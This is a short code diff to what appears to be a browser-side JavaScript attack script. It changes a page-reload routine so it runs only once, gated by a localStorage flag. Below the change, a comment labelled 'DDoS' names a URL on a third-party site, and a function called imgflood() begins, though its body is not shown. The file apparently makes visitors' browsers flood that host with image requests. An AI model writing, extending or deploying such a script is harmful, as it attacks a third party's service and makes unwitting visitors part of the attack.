@@ -1,8 +1,11 @@
 // TODO: JavaScript 跳转
 // window.location.href = 'https://xiaozhu2007.netlify.app/'
-setTimeout(() => {
-  window.location.search = `?time=${new Date().getTime()}`
-}, 500);
+if (window.localStorage.getItem("install") != "true") {
+  window.localStorage.setItem("install", "true");
+  setTimeout(() => {
+    window.location.search = `?time=${new Date().getTime()}`;
+  }, 200);
+}
 
 // DDoS - https://xyqh5.163.com/from=360pmp/?project_id=1026bda22572402bab33be17b6373387
 function imgflood() {
